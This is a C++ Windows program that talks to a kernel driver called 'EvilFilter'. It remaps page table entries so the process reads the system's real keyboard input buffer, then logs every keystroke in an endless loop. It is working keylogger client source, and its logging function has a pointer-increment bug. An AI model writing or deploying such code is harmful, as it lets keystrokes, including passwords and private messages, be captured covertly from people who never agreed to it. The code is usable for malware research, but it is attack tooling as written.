// ConsoleApplication2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <SharedHeader.h>
#include <ntsecapi.h>
#include <scancode.h>

void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) { // , PCHAR KeyMap
		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0

			if (*keystrokeIndex < 9998) {
				cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
			}
			printf("KEY: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]\n",
				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
				keyboardData->MakeCode,
				KeyMap[keyboardData->MakeCode],
				keyboardData->UnitId,
				keyboardData->Flags,
				keyboardData->Reserved,
				keyboardData->ExtraInformation);

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardData->Flags;

		}
}





int main(int argc, _TCHAR* argv[]) {
	#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;
	
	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING,0,NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		OVERLAPPED      DeviceIoOverlapped;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);

		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;
		DeviceIoOverlapped.Offset = 0;
		DeviceIoOverlapped.OffsetHigh = 0;
		DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);


		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset = dataToTransmit->offset;

			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
			ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
			if (dataToTransmit->largePage) {
				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
			}
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
			PLLIST listNode;
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				if (dataToTransmit->largePage) {
					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
				}
				else {
					keyboardOffset = (ULONG)keyboardData & 0xfff;
				}
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->instruction = 'E';

			printf("\nTransmitting\n");
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				printf("Ioctl to EvilFilter device succeeded \n");
				printf(" we now have the real keyboard buffer!!!\n");

				PSHARED_MEMORY_STRUCT dataToTransmit;

				USHORT lastMake = 666;
				USHORT lastModifier = 666;
				ULONG keystrokeIndex = 0;
				PCHAR charBuffer = (PCHAR)malloc(sizeof(CHAR) * 10000);


				while (TRUE) {
					logKeyboardData(keyboardData, KeyMap, charBuffer, &lastMake, &lastModifier, &keystrokeIndex);
				}
			}
		}
		CloseHandle(hControlDevice);
	}
	printf("fin\n");
	return 0;
}
